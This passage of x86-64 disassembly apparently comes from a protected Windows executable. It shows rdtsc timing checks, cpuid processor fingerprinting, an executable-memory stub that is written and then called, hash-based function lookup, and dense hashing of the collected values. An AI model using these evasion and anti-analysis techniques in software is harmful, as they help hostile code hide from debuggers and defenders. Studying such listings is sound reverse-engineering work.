   14003f275:	mov    QWORD PTR [rbp+0xad0],rax
   14003f27c:	mov    QWORD PTR [rbp+0xad8],r8
   14003f283:	mov    eax,0xc880000d
   14003f288:	mov    QWORD PTR [rbp+0xae0],rax
   14003f28f:	lea    rax,[rip+0x5edc5]        # 0x14009e05b
   14003f296:	mov    QWORD PTR [rbp+0xae8],rax
   14003f29d:	mov    QWORD PTR [rbp+0xaf0],rdx
   14003f2a4:	mov    eax,0xc890000d
   14003f2a9:	mov    QWORD PTR [rbp+0xaf8],rax
   14003f2b0:	call   0x140065fcc
   14003f2b5:	mov    rsi,rax
   14003f2b8:	dec    rax
   14003f2bb:	cmp    rax,0xfffffffffffffffd
   14003f2bf:	ja     0x14003f38d
   14003f2c5:	mov    ecx,0x238
   14003f2ca:	xor    eax,eax
   14003f2cc:	lea    rdx,[rbp+0xd10]
   14003f2d3:	mov    rdi,rdx
   14003f2d6:	rep stos BYTE PTR [rdi],al
   14003f2d8:	mov    DWORD PTR [rbp+0xd10],0x238
   14003f2e2:	mov    rcx,rsi
   14003f2e5:	call   0x140065d8b
   14003f2ea:	test   eax,eax
   14003f2ec:	movabs r14,0x406aa9c82dbf9701
   14003f2f6:	je     0x14003f389
   14003f2fc:	lea    rdi,[rbp+0xb00]
   14003f303:	lea    r15,[rbp+0xd3c]
   14003f30a:	mov    QWORD PTR [rbp+0xf80],r15
   14003f311:	lea    rax,[rbp+0xf44]
   14003f318:	mov    QWORD PTR [rbp+0xf88],rax
   14003f31f:	lea    rbx,[rbp+0xf80]
   14003f326:	mov    rcx,rbx
   14003f329:	call   0x14003c35d
   14003f32e:	test   al,0x1
   14003f330:	mov    eax,0x104
   14003f335:	cmove  rdx,rax
   14003f339:	mov    rcx,r15
   14003f33c:	lea    r8,[rip+0x48fc5]        # 0x140088308
   14003f343:	call   0x14003c091
   14003f348:	mov    r8,rdx
   14003f34b:	mov    QWORD PTR [rbp+0xf80],r13
   14003f352:	mov    QWORD PTR [rbp+0xf88],rdi
   14003f359:	mov    rcx,rbx
   14003f35c:	mov    rdx,rax
   14003f35f:	call   0x14003c1f4
   14003f364:	test   al,al
   14003f366:	jne    0x14003f39b
   14003f368:	mov    DWORD PTR [rbp+0xd10],0x238
   14003f372:	mov    rcx,rsi
   14003f375:	lea    rdx,[rbp+0xd10]
   14003f37c:	call   0x140065aff
   14003f381:	test   eax,eax
   14003f383:	jne    0x14003f303
   14003f389:	xor    edi,edi
   14003f38b:	jmp    0x14003f3a5
   14003f38d:	xor    edi,edi
   14003f38f:	movabs r14,0x406aa9c82dbf9701
   14003f399:	jmp    0x14003f3ad
   14003f39b:	movabs rdi,0x1000000000000
   14003f3a5:	mov    rcx,rsi
   14003f3a8:	call   0x140064323
   14003f3ad:	xor    eax,eax
   14003f3af:	cmp    DWORD PTR [rbp+0x6f8],0x4
   14003f3b6:	setb   al
   14003f3b9:	movzx  ecx,BYTE PTR [rbp+0x1168]
   14003f3c0:	shl    rcx,0x28
   14003f3c4:	add    rcx,rdi
   14003f3c7:	movzx  edx,BYTE PTR [rbp+0x1158]
   14003f3ce:	shl    rdx,0x20
   14003f3d2:	add    rdx,rcx
   14003f3d5:	add    rdx,QWORD PTR [rbp+0x1138]
   14003f3dc:	add    rdx,QWORD PTR [rbp+0xf78]
   14003f3e3:	shl    eax,0x8
   14003f3e6:	add    rax,rdx
   14003f3e9:	movzx  ecx,BYTE PTR [rbp+0x4d8]
   14003f3f0:	and    ecx,0x1
   14003f3f3:	or     ecx,eax
   14003f3f5:	mov    rdx,rax
   14003f3f8:	shr    rdx,0x30
   14003f3fc:	mov    BYTE PTR [rbp+0x7d6],dl
   14003f402:	shr    rax,0x20
   14003f406:	mov    WORD PTR [rbp+0x7d4],ax
   14003f40d:	mov    DWORD PTR [rbp+0x7d0],ecx
   14003f413:	xor    eax,eax
   14003f415:	movabs rcx,0x5cc804d7e1924f60
   14003f41f:	mov    r8,QWORD PTR [rbp+0x3e8]
   14003f426:	mov    rdi,QWORD PTR [rbp+0x1058]
   14003f42d:	cmp    rax,0x7
   14003f431:	je     0x14003f50b
   14003f437:	movzx  ebx,BYTE PTR [rbp+rax*1+0x7d0]
   14003f43f:	mov    rdx,r8
   14003f442:	xor    rdx,rcx
   14003f445:	imul   rdx,r14
   14003f449:	mov    r9,rdx
   14003f44c:	shr    r9,0x1d
   14003f450:	xor    r9,rdx
   14003f453:	imul   r9,r12
   14003f457:	mov    rdx,r9
   14003f45a:	shr    rdx,0x20
   14003f45e:	xor    rdx,r9
   14003f461:	mov    r9,rcx
   14003f464:	movabs r10,0x629eef0eeda7e1b9
   14003f46e:	xor    r9,r10
   14003f471:	imul   r9,r14
   14003f475:	mov    r11,r9
   14003f478:	shr    r11,0x1d
   14003f47c:	xor    r11,r9
   14003f47f:	imul   r11,r12
   14003f483:	mov    r10,r11
   14003f486:	shr    r10,0x20
   14003f48a:	xor    r10,r11
   14003f48d:	or     r10,0x1
   14003f491:	mov    r11,rdx
   14003f494:	rol    r11,0x7
   14003f498:	mov    rsi,rdx
   14003f49b:	rol    rsi,0x29
   14003f49f:	add    r11,rcx
   14003f4a2:	add    rbx,r11
   14003f4a5:	imul   rbx,r10
   14003f4a9:	add    rbx,r8
   14003f4ac:	mov    r9,rcx
   14003f4af:	rol    r9,0x20
   14003f4b3:	add    rbx,rdi
   14003f4b6:	movabs r15,0x6161c4ba7c2419b8
   14003f4c0:	xor    r9,r15
   14003f4c3:	lea    rdi,[rsi+r9*1]
   14003f4c7:	sub    r9,r11
   14003f4ca:	add    r9,rsi
   14003f4cd:	imul   rdi,r10
   14003f4d1:	imul   r9,r10
   14003f4d5:	sub    r9,rdx
   14003f4d8:	sub    r9,rdi
   14003f4db:	add    r9,rbx
   14003f4de:	xor    rcx,r15
   14003f4e1:	imul   rcx,r14
   14003f4e5:	mov    r8,rcx
   14003f4e8:	shr    r8,0x1d
   14003f4ec:	xor    r8,rcx
   14003f4ef:	imul   r8,r12
   14003f4f3:	mov    rcx,r8
   14003f4f6:	shr    rcx,0x20
   14003f4fa:	xor    rcx,r8
   14003f4fd:	inc    rax
   14003f500:	mov    r8,rdx
   14003f503:	mov    rdi,r9
   14003f506:	jmp    0x14003f42d
   14003f50b:	add    r8,rdi
   14003f50e:	mov    rcx,QWORD PTR [rbp+0xf60]
   14003f515:	mov    rdx,QWORD PTR [rbp+0x1180]
   14003f51c:	call   0x140063dd8
   14003f521:	mov    QWORD PTR [rbp+0x1168],rax
   14003f528:	mov    rax,QWORD PTR [rbp+0x1160]
   14003f52f:	mov    rcx,QWORD PTR [rax+0x20]
   14003f533:	rdtsc
   14003f535:	shl    rdx,0x20
   14003f539:	or     rdx,rax
   14003f53c:	movabs r15,0x67e7848434fd75b7
   14003f546:	xor    rdx,r15
   14003f549:	imul   rdx,r14
   14003f54d:	mov    rax,rdx
   14003f550:	shr    rax,0x1d
   14003f554:	xor    rax,rdx
   14003f557:	imul   rax,r12
   14003f55b:	mov    rbx,rax
   14003f55e:	shr    rbx,0x20
   14003f562:	xor    rbx,rax
   14003f565:	mov    rdi,rbx
   14003f568:	neg    rdi
   14003f56b:	add    rdi,rcx
   14003f56e:	mov    ecx,0x1000
   14003f573:	push   0x40
   14003f575:	pop    rdx
   14003f576:	call   0x1400647f5
   14003f57b:	movabs r14,0x67e7848534fd75b6
   14003f585:	test   rax,rax
   14003f588:	je     0x14003f5c4
   14003f58a:	mov    rsi,rax
   14003f58d:	mov    BYTE PTR [rax],0xb8
   14003f590:	mov    DWORD PTR [rax+0x1],0xdead
   14003f597:	mov    BYTE PTR [rax+0x5],0xc3
   14003f59b:	call   rax
   14003f59d:	mov    DWORD PTR [rbp+0x7d0],eax
   14003f5a3:	mov    DWORD PTR [rsi+0x1],0xbeef
   14003f5aa:	call   rsi
   14003f5ac:	mov    DWORD PTR [rbp+0x7d0],eax
   14003f5b2:	mov    r14d,DWORD PTR [rbp+0x7d0]
   14003f5b9:	mov    rcx,rsi
   14003f5bc:	call   0x1400647b6
   14003f5c1:	add    r14,r15
   14003f5c4:	mov    rax,rbx
   14003f5c7:	xor    rax,r15
   14003f5ca:	movabs rcx,0x406aa9c82dbf9701
   14003f5d4:	imul   rax,rcx
   14003f5d8:	mov    rcx,rax
   14003f5db:	shr    rcx,0x1d
   14003f5df:	xor    rcx,rax
   14003f5e2:	imul   rcx,r12
   14003f5e6:	mov    r9,rcx
   14003f5e9:	shr    r9,0x20
   14003f5ed:	xor    r9,rcx
   14003f5f0:	mov    rcx,r9
   14003f5f3:	rol    rcx,0x7
   14003f5f7:	mov    r10,r9
   14003f5fa:	rol    r10,0x29
   14003f5fe:	add    r14,rcx
   14003f601:	mov    rax,r10
   14003f604:	sub    r10,rcx
   14003f607:	movabs rcx,0x89dc2137761f2681
   14003f611:	imul   r14,rcx
   14003f615:	add    r14,rbx
   14003f618:	imul   rax,rcx
   14003f61c:	movabs rdx,0x60a5613a1ed5d3ab
   14003f626:	add    rax,rdx
   14003f629:	imul   r10,rcx
   14003f62d:	movabs rcx,0x6ed1ae06cad2a805
   14003f637:	add    r10,rcx
   14003f63a:	add    r14,rdi
   14003f63d:	sub    r10,r9
   14003f640:	sub    r10,rax
   14003f643:	add    r10,r14
   14003f646:	movaps XMMWORD PTR [rbp+0x7f0],xmm6
   14003f64d:	movaps XMMWORD PTR [rbp+0x7e0],xmm6
   14003f654:	movaps XMMWORD PTR [rbp+0x7d0],xmm6
   14003f65b:	mov    r8d,0x80000002
   14003f661:	xor    edi,edi
   14003f663:	push   0xc
   14003f665:	pop    r11
   14003f667:	movabs r15,0x5bd1e9953c278a41
   14003f671:	test   dil,0x1
   14003f675:	jne    0x14003f6d3
   14003f677:	cmp    r8d,0x80000004
   14003f67e:	ja     0x14003f6d3
   14003f680:	xor    ecx,ecx
   14003f682:	mov    eax,r8d
   14003f685:	mov    rsi,rbx
   14003f688:	cpuid
   14003f68a:	xchg   rbx,rsi
   14003f68d:	cmp    r11,0x3c
   14003f691:	je     0x140048137
   14003f697:	lea    ebx,[r8+0x1]
   14003f69b:	cmp    r8d,0x80000004
   14003f6a2:	sete   dil
   14003f6a6:	cmove  ebx,r8d
   14003f6aa:	mov    DWORD PTR [rbp+r11*1+0x7c4],eax
   14003f6b2:	mov    DWORD PTR [rbp+r11*1+0x7c8],esi
   14003f6ba:	mov    DWORD PTR [rbp+r11*1+0x7cc],ecx
   14003f6c2:	mov    DWORD PTR [rbp+r11*1+0x7d0],edx
   14003f6ca:	add    r11,0x10
   14003f6ce:	mov    r8d,ebx
   14003f6d1:	jmp    0x14003f671
   14003f6d3:	mov    r11b,BYTE PTR [rbp+0x7d0]
   14003f6da:	xor    r8d,r8d
   14003f6dd:	xor    esi,esi
   14003f6df:	movabs r14,0x406aa9c82dbf9701
   14003f6e9:	cmp    esi,0x4
   14003f6ec:	je     0x14003f744
   14003f6ee:	rdtsc
   14003f6f0:	mov    rcx,rdx
   14003f6f3:	shl    rcx,0x20
   14003f6f7:	or     rcx,rax
   14003f6fa:	mov    QWORD PTR [rbp+0x7d0],0x9d
   14003f705:	mov    rax,QWORD PTR [rbp+0x7d0]
   14003f70c:	mov    edx,0x1000
   14003f711:	sub    edx,0x1
   14003f714:	jb     0x14003f726
   14003f716:	mov    rdi,rax
   14003f719:	imul   rdi,r15
   14003f71d:	shr    rax,0x1d
   14003f721:	xor    rax,rdi
   14003f724:	jmp    0x14003f711
   14003f726:	inc    esi
   14003f728:	mov    QWORD PTR [rbp+0x7d0],rax
   14003f72f:	rdtsc
   14003f731:	shl    rdx,0x20
   14003f735:	or     rdx,rax
   14003f738:	sub    rdx,rcx
   14003f73b:	cmp    rdx,r8
   14003f73e:	cmova  r8,rdx
   14003f742:	jmp    0x14003f6e9
   14003f744:	mov    rax,r9
   14003f747:	movabs rcx,0x871ce0d846517ac9
   14003f751:	xor    rax,rcx
   14003f754:	imul   rax,r14
   14003f758:	mov    rcx,rax
   14003f75b:	shr    rcx,0x1d
   14003f75f:	xor    rcx,rax
   14003f762:	imul   rcx,r12
   14003f766:	mov    rax,rcx
   14003f769:	shr    rax,0x20
   14003f76d:	xor    rax,rcx
   14003f770:	mov    rsi,rax
   14003f773:	rol    rsi,0x7
   14003f777:	mov    rcx,rax
   14003f77a:	rol    rcx,0x29
   14003f77e:	cmp    r11b,0x1
   14003f782:	mov    rdx,rsi
   14003f785:	adc    rdx,0x0
   14003f789:	mov    r11,rcx
   14003f78c:	sub    rcx,rsi
   14003f78f:	movabs rsi,0x678abdfef684ba71
   14003f799:	imul   rdx,rsi
   14003f79d:	movabs rdi,0x5e0b28fcb2d13cb9
   14003f7a7:	add    rdx,rdi
   14003f7aa:	imul   r11,rsi
   14003f7ae:	movabs rdi,0xbe7debfc1ed5d360
   14003f7b8:	add    r11,rdi
   14003f7bb:	imul   rcx,rsi
   14003f7bf:	movabs rsi,0x6072c2ff6c0496a7
   14003f7c9:	add    rcx,rsi
   14003f7cc:	add    rdx,r9
   14003f7cf:	add    rdx,r10
   14003f7d2:	sub    rcx,rax
   14003f7d5:	sub    rcx,r11
   14003f7d8:	mov    r9,rax
   14003f7db:	movabs r10,0x3e451175b9bfba90
   14003f7e5:	xor    r9,r10
   14003f7e8:	imul   r9,r14
   14003f7ec:	mov    r10,r9
   14003f7ef:	shr    r10,0x1d
   14003f7f3:	xor    r10,r9
   14003f7f6:	imul   r10,r12
   14003f7fa:	mov    rsi,r10
   14003f7fd:	shr    rsi,0x20
   14003f801:	xor    rsi,r10
   14003f804:	mov    r9,rsi
   14003f807:	rol    r9,0x7
   14003f80b:	add    rcx,rdx
   14003f80e:	mov    rdi,rsi
   14003f811:	rol    rdi,0x29
   14003f815:	cmp    r8,0x200
   14003f81c:	mov    rdx,r9
   14003f81f:	sbb    rdx,0xffffffffffffffff
   14003f823:	mov    r8,rdi
   14003f826:	sub    rdi,r9
   14003f829:	movabs r9,0x4a8df669e8d834af
   14003f833:	imul   rdx,r9
   14003f837:	movabs r10,0xd2a7391cd575c870
   14003f841:	add    rdx,r10
   14003f844:	add    rdx,rax
   14003f847:	add    rdx,rcx
   14003f84a:	imul   r8,r9
   14003f84e:	movabs rax,0xf4156b733eedcd2
   14003f858:	add    r8,rax
   14003f85b:	imul   rdi,r9
   14003f85f:	movabs rax,0xf20c273075a0dfb3
   14003f869:	add    rdi,rax
   14003f86c:	sub    rdi,rsi
   14003f86f:	sub    rdi,r8
   14003f872:	add    rdi,rdx
   14003f875:	mov    rbx,QWORD PTR [rip+0x5878c]        # 0x140098008
   14003f87c:	call   0x1400641a4
   14003f881:	mov    r8,rbx
   14003f884:	cmp    rax,0x1
   14003f888:	jne    0x14003f8b3
   14003f88a:	movabs rax,0x828be76a59740b3e
   14003f894:	xor    rdx,rax
   14003f897:	imul   rdx,r14
   14003f89b:	mov    rax,rdx
   14003f89e:	shr    rax,0x1d
   14003f8a2:	xor    rax,rdx
   14003f8a5:	imul   rax,r12
   14003f8a9:	mov    r8,rax
   14003f8ac:	shr    r8,0x20
   14003f8b0:	xor    r8,rax
   14003f8b3:	mov    rax,rsi
   14003f8b6:	movabs rcx,0x1112c8f0854959b2
   14003f8c0:	xor    rax,rcx
   14003f8c3:	imul   rax,r14
   14003f8c7:	mov    rcx,rax
   14003f8ca:	shr    rcx,0x1d
   14003f8ce:	xor    rcx,rax
   14003f8d1:	imul   rcx,r12
   14003f8d5:	mov    rax,rcx
   14003f8d8:	shr    rax,0x20
   14003f8dc:	xor    rax,rcx
   14003f8df:	mov    rdx,rax
   14003f8e2:	rol    rdx,0x7
   14003f8e6:	mov    rcx,rax
   14003f8e9:	rol    rcx,0x29
   14003f8ed:	add    rbx,rdx
   14003f8f0:	add    r8,rcx
   14003f8f3:	sub    rcx,rdx
   14003f8f6:	movabs rdx,0xdd2cc34f540e7fd
   14003f900:	imul   rbx,rdx
   14003f904:	movabs r9,0x62f6334eafed42ea
   14003f90e:	add    rbx,r9
   14003f911:	imul   r8,rdx
   14003f915:	movabs r9,0xa76e727ea004cc28
   14003f91f:	add    r8,r9
   14003f922:	imul   rcx,rdx
   14003f926:	movabs rdx,0x44783f2ff017893e
   14003f930:	add    rcx,rdx
   14003f933:	add    rbx,rsi
   14003f936:	add    rbx,rdi
   14003f939:	sub    rcx,rax
   14003f93c:	sub    rcx,r8
   14003f93f:	add    rcx,rbx
   14003f942:	mov    edx,DWORD PTR [rbp+0x4e0]
   14003f948:	mov    r8,rax
   14003f94b:	movabs r9,0x5d1f41e2fb54cee7
   14003f955:	xor    r8,r9
   14003f958:	imul   r8,r14
   14003f95c:	mov    r9,r8
   14003f95f:	shr    r9,0x1d
   14003f963:	xor    r9,r8
   14003f966:	imul   r9,r12
   14003f96a:	mov    r13,r9
   14003f96d:	shr    r13,0x20
   14003f971:	xor    r13,r9
   14003f974:	mov    r9,r13
   14003f977:	rol    r9,0x7
   14003f97b:	mov    r15,r13
   14003f97e:	rol    r15,0x29
   14003f982:	add    rdx,r9
   14003f985:	mov    r8,r15
   14003f988:	sub    r15,r9
   14003f98b:	movabs r9,0xeeb07943ee33699f
   14003f995:	imul   rdx,r9
   14003f999:	movabs r10,0xac1e44c4dc8e4079
   14003f9a3:	add    rdx,r10
   14003f9a6:	add    rdx,rax
   14003f9a9:	add    rdx,rcx
   14003f9ac:	imul   r8,r9
   14003f9b0:	movabs rax,0x56cf16fd4106c9e6
   14003f9ba:	add    r8,rax
   14003f9bd:	imul   r15,r9
   14003f9c1:	movabs rax,0xaab0d2386478896d
   14003f9cb:	add    r15,rax
   14003f9ce:	sub    r15,r13
   14003f9d1:	sub    r15,r8
   14003f9d4:	add    r15,rdx
   14003f9d7:	mov    al,BYTE PTR [rip+0x591db]        # 0x140098bb8
   14003f9dd:	cmp    al,0x1
   14003f9df:	je     0x14003fa00
   14003f9e1:	movzx  eax,al
   14003f9e4:	test   eax,eax
   14003f9e6:	jne    0x14003fa58
   14003f9e8:	call   0x140065d51
   14003f9ed:	test   rax,rax
   14003f9f0:	sete   cl
   14003f9f3:	inc    cl
   14003f9f5:	mov    BYTE PTR [rip+0x591bd],cl        # 0x140098bb8
   14003f9fb:	test   rax,rax
   14003f9fe:	je     0x14003fa58
   14003fa00:	mov    ecx,0x1000
   14003fa05:	push   0x4
   14003fa07:	pop    rdx
   14003fa08:	call   0x1400647f5
   14003fa0d:	test   rax,rax
   14003fa10:	je     0x14003fa7c
   14003fa12:	mov    rbx,rax
   14003fa15:	and    DWORD PTR [rbp+0xd10],0x0
   14003fa1c:	lea    rcx,[rip+0x590b5]        # 0x140098ad8
   14003fa23:	mov    edx,0xba7c2f
   14003fa28:	mov    r8d,0x6f217213
   14003fa2e:	call   0x140064358
   14003fa33:	test   rax,rax
   14003fa36:	je     0x14003faa0
   14003fa38:	mov    edx,0x1000
   14003fa3d:	mov    rcx,rbx
   14003fa40:	push   0x2
   14003fa42:	pop    r8
   14003fa44:	lea    r9,[rbp+0xd10]
   14003fa4b:	call   rax
   14003fa4d:	xor    r12d,r12d
   14003fa50:	test   eax,eax
   14003fa52:	setne  r12b
   14003fa56:	jmp    0x14003faa3
   14003fa58:	xor    eax,eax
   14003fa5a:	cmp    rax,0x40
   14003fa5e:	je     0x14003fb59
   14003fa64:	or     QWORD PTR [rbp+rax*1+0x7d0],0xffffffffffffffff
   14003fa6d:	and    QWORD PTR [rbp+rax*1+0x7d8],0x0
   14003fa76:	add    rax,0x10
   14003fa7a:	jmp    0x14003fa5a
   14003fa7c:	xor    eax,eax
   14003fa7e:	cmp    rax,0x40
   14003fa82:	je     0x14003fb59
   14003fa88:	or     QWORD PTR [rbp+rax*1+0x7d0],0xffffffffffffffff
   14003fa91:	and    QWORD PTR [rbp+rax*1+0x7d8],0x0
   14003fa9a:	add    rax,0x10
   14003fa9e:	jmp    0x14003fa7e
   14003faa0:	xor    r12d,r12d
   14003faa3:	mov    r14,rbx
   14003faa6:	add    r14,0xe4e
   14003faad:	call   0x140064227
   14003fab2:	mov    eax,0xc883a7e
   14003fab7:	xchg   DWORD PTR [rip+0x59023],eax        # 0x140098ae0
   14003fabd:	mov    r9,r14
   14003fac0:	lea    rsi,[rip+0xa]        # 0x14003fad1
   14003fac7:	lea    rdi,[rip+0x7]        # 0x14003fad5
   14003face:	mov    r11,r9
   14003fad1:	mov    BYTE PTR [r9],0xed
   14003fad5:	mov    r8,r11
   14003fad8:	mov    rsi,r8
   14003fadb:	xor    eax,eax
   14003fadd:	xchg   DWORD PTR [rip+0x58ffd],eax        # 0x140098ae0
   14003fae3:	mov    BYTE PTR [rip+0x58fa4],0x0        # 0x140098a8e
   14003faea:	movzx  edi,BYTE PTR [rbx+0xe4e]
   14003faf1:	mov    rcx,rbx
   14003faf4:	call   0x1400647b6
   14003faf9:	mov    eax,DWORD PTR [rbp+0xd10]
   14003faff:	btc    r14,0x30
   14003fb04:	mov    QWORD PTR [rbp+0x7d0],r12
   14003fb0b:	mov    QWORD PTR [rbp+0x7d8],0x1
   14003fb16:	mov    QWORD PTR [rbp+0x7e0],rax
   14003fb1d:	mov    QWORD PTR [rbp+0x7e8],0x4
   14003fb28:	mov    QWORD PTR [rbp+0x7f0],rsi
   14003fb2f:	mov    QWORD PTR [rbp+0x7f8],r14
   14003fb36:	mov    QWORD PTR [rbp+0x800],rdi
   14003fb3d:	and    QWORD PTR [rbp+0x808],0x0
   14003fb45:	movabs r14,0x406aa9c82dbf9701
   14003fb4f:	movabs r12,0xeb591050d1f713a9
   14003fb59:	xor    eax,eax
   14003fb5b:	movabs rcx,0x73706dc82e51a60
   14003fb65:	cmp    rax,0x40
   14003fb69:	je     0x14003fc49
   14003fb6f:	mov    rdx,r13
   14003fb72:	xor    rdx,rcx
   14003fb75:	imul   rdx,r14
   14003fb79:	mov    r8,rdx
   14003fb7c:	shr    r8,0x1d
   14003fb80:	xor    r8,rdx
   14003fb83:	imul   r8,r12
   14003fb87:	mov    rdx,r8
   14003fb8a:	shr    rdx,0x20
   14003fb8e:	xor    rdx,r8
   14003fb91:	mov    r8,rcx
   14003fb94:	movabs r9,0x629eef0eeda7e1b9
   14003fb9e:	xor    r8,r9
   14003fba1:	imul   r8,r14
   14003fba5:	mov    r10,r8
   14003fba8:	shr    r10,0x1d
   14003fbac:	xor    r10,r8
   14003fbaf:	imul   r10,r12
   14003fbb3:	mov    r9,r10
   14003fbb6:	shr    r9,0x20
   14003fbba:	xor    r9,r10
   14003fbbd:	mov    r10,rdx
   14003fbc0:	rol    r10,0x7
   14003fbc4:	or     r9,0x1
   14003fbc8:	mov    r11,rdx
   14003fbcb:	rol    r11,0x29
   14003fbcf:	add    r10,rcx
   14003fbd2:	mov    r8,QWORD PTR [rbp+rax*1+0x7d0]
   14003fbda:	add    r8,r10
   14003fbdd:	imul   r8,r9
   14003fbe1:	add    r8,r13
   14003fbe4:	add    r8,r15
   14003fbe7:	mov    r15,rcx
   14003fbea:	rol    r15,0x20
   14003fbee:	movabs rdi,0x6161c4ba7c2419b8
   14003fbf8:	xor    r15,rdi
   14003fbfb:	lea    rsi,[r11+r15*1]
   14003fbff:	sub    r15,r10
   14003fc02:	add    rsi,QWORD PTR [rbp+rax*1+0x7d8]
   14003fc0a:	add    r15,r11
   14003fc0d:	imul   rsi,r9
   14003fc11:	imul   r15,r9
   14003fc15:	sub    r15,rdx
   14003fc18:	sub    r15,rsi
   14003fc1b:	add    r15,r8
   14003fc1e:	xor    rcx,rdi
   14003fc21:	imul   rcx,r14
   14003fc25:	mov    r8,rcx
   14003fc28:	shr    r8,0x1d
   14003fc2c:	xor    r8,rcx
   14003fc2f:	imul   r8,r12
   14003fc33:	mov    rcx,r8
   14003fc36:	shr    rcx,0x20
   14003fc3a:	xor    rcx,r8
   14003fc3d:	add    rax,0x10
   14003fc41:	mov    r13,rdx
   14003fc44:	jmp    0x14003fb65
   14003fc49:	xor    ecx,ecx
   14003fc4b:	push   0x4
   14003fc4d:	pop    rdx
   14003fc4e:	call   0x1400647f5
   14003fc53:	mov    rsi,rax
   14003fc56:	mov    edi,DWORD PTR gs:0x68
   14003fc5e:	xor    ecx,ecx
   14003fc60:	call   0x1400647b6
   14003fc65:	mov    ecx,DWORD PTR gs:0x68
   14003fc6d:	mov    eax,eax
   14003fc6f:	mov    QWORD PTR [rbp+0x7d0],rsi
   14003fc76:	and    QWORD PTR [rbp+0x7d8],0x0
   14003fc7e:	mov    QWORD PTR [rbp+0x7e0],rax
   14003fc85:	and    QWORD PTR [rbp+0x7e8],0x0
   14003fc8d:	mov    eax,edi
   14003fc8f:	mov    ecx,ecx
   14003fc91:	mov    QWORD PTR [rbp+0x7f0],rax
   14003fc98:	mov    QWORD PTR [rbp+0x7f8],0x57
   14003fca3:	mov    QWORD PTR [rbp+0x800],rcx
   14003fcaa:	mov    QWORD PTR [rbp+0x808],0x1e7
   14003fcb5:	xor    eax,eax
   14003fcb7:	movabs rcx,0x95978c0b9ca55222
   14003fcc1:	cmp    rax,0x40
   14003fcc5:	je     0x14003fda5
   14003fccb:	mov    rdx,r13
   14003fcce:	xor    rdx,rcx
   14003fcd1:	imul   rdx,r14
   14003fcd5:	mov    r8,rdx
   14003fcd8:	shr    r8,0x1d
   14003fcdc:	xor    r8,rdx
   14003fcdf:	imul   r8,r12
   14003fce3:	mov    rdx,r8
   14003fce6:	shr    rdx,0x20
   14003fcea:	xor    rdx,r8
   14003fced:	mov    r8,rcx
   14003fcf0:	movabs r9,0x629eef0eeda7e1b9
   14003fcfa:	xor    r8,r9
   14003fcfd:	imul   r8,r14
   14003fd01:	mov    r10,r8
   14003fd04:	shr    r10,0x1d
   14003fd08:	xor    r10,r8
   14003fd0b:	imul   r10,r12
   14003fd0f:	mov    r9,r10
   14003fd12:	shr    r9,0x20
   14003fd16:	xor    r9,r10
   14003fd19:	mov    r10,rdx
   14003fd1c:	rol    r10,0x7
   14003fd20:	or     r9,0x1
   14003fd24:	mov    r11,rdx
   14003fd27:	rol    r11,0x29
   14003fd2b:	add    r10,rcx
   14003fd2e:	mov    r8,QWORD PTR [rbp+rax*1+0x7d0]
   14003fd36:	add    r8,r10
   14003fd39:	imul   r8,r9
   14003fd3d:	add    r8,r13
   14003fd40:	add    r8,r15
   14003fd43:	mov    r15,rcx
   14003fd46:	rol    r15,0x20
   14003fd4a:	movabs rdi,0x6161c4ba7c2419b8
   14003fd54:	xor    r15,rdi
   14003fd57:	lea    rsi,[r11+r15*1]
   14003fd5b:	sub    r15,r10
   14003fd5e:	add    rsi,QWORD PTR [rbp+rax*1+0x7d8]
   14003fd66:	add    r15,r11
   14003fd69:	imul   rsi,r9
   14003fd6d:	imul   r15,r9
   14003fd71:	sub    r15,rdx
   14003fd74:	sub    r15,rsi
   14003fd77:	add    r15,r8
   14003fd7a:	xor    rcx,rdi
   14003fd7d:	imul   rcx,r14
   14003fd81:	mov    r8,rcx
   14003fd84:	shr    r8,0x1d
   14003fd88:	xor    r8,rcx
   14003fd8b:	imul   r8,r12
   14003fd8f:	mov    rcx,r8
   14003fd92:	shr    rcx,0x20
   14003fd96:	xor    rcx,r8
   14003fd99:	add    rax,0x10
   14003fd9d:	mov    r13,rdx
   14003fda0:	jmp    0x14003fcc1
   14003fda5:	mov    rax,QWORD PTR [rbp+0x6b0]
   14003fdac:	mov    rsi,QWORD PTR [rax+0x30]
   14003fdb0:	test   rsi,rsi
   14003fdb3:	je     0x140040031
   14003fdb9:	xor    eax,eax
   14003fdbb:	lea    r14,[rip+0x58cee]        # 0x140098ab0
   14003fdc2:	cmp    rax,0x5
   14003fdc6:	je     0x14003fdd6
   14003fdc8:	and    QWORD PTR [rbp+rax*8+0xd10],0x0
   14003fdd1:	inc    rax
   14003fdd4:	jmp    0x14003fdc2
   14003fdd6:	xor    ebx,ebx
   14003fdd8:	cmp    rbx,0x28
   14003fddc:	je     0x14003fe1d
   14003fdde:	lea    rax,[rip+0x483b3]        # 0x140088198
   14003fde5:	mov    rdi,QWORD PTR [rbx+rax*1]
   14003fde9:	mov    rcx,r14
   14003fdec:	mov    edx,0xba7c2f
   14003fdf1:	mov    r8d,0xa86f2af6
   14003fdf7:	call   0x140064358
   14003fdfc:	test   rax,rax
   14003fdff:	je     0x14003fe0d
   14003fe01:	mov    rcx,rsi
   14003fe04:	xor    edx,edx
   14003fe06:	mov    r8,rdi
   14003fe09:	call   rax
   14003fe0b:	jmp    0x14003fe0f
   14003fe0d:	xor    eax,eax
   14003fe0f:	mov    QWORD PTR [rbp+rbx*1+0xd10],rax
   14003fe17:	add    rbx,0x8
   14003fe1b:	jmp    0x14003fdd8
   14003fe1d:	xor    eax,eax
   14003fe1f:	cmp    rax,0xa0
   14003fe25:	je     0x14003fe35
   14003fe27:	movups XMMWORD PTR [rbp+rax*1+0x7d0],xmm6
   14003fe2f:	add    rax,0x10
   14003fe33:	jmp    0x14003fe1f
   14003fe35:	xor    r14d,r14d
   14003fe38:	cmp    r14,0x28
   14003fe3c:	je     0x14003fed9
   14003fe42:	mov    rdi,QWORD PTR [rbp+r14*1+0xd10]
   14003fe4a:	push   0xffffffffffffffff
   14003fe4c:	pop    rbx
   14003fe4d:	test   rdi,rdi
   14003fe50:	je     0x14003fea1
   14003fe52:	lea    rcx,[rip+0x58c67]        # 0x140098ac0
   14003fe59:	mov    edx,0xba7c2f
   14003fe5e:	mov    r8d,0x4f965d7d
   14003fe64:	call   0x140064358
   14003fe69:	test   rax,rax
   14003fe6c:	je     0x14003fe7b
   14003fe6e:	mov    rcx,rsi
   14003fe71:	xor    edx,edx
   14003fe73:	mov    r8,rdi
   14003fe76:	call   rax
   14003fe78:	mov    rbx,rax
   14003fe7b:	lea    rcx,[rip+0x58c36]        # 0x140098ab8
   14003fe82:	mov    edx,0xba7c2f
   14003fe87:	mov    r8d,0xb05949f4
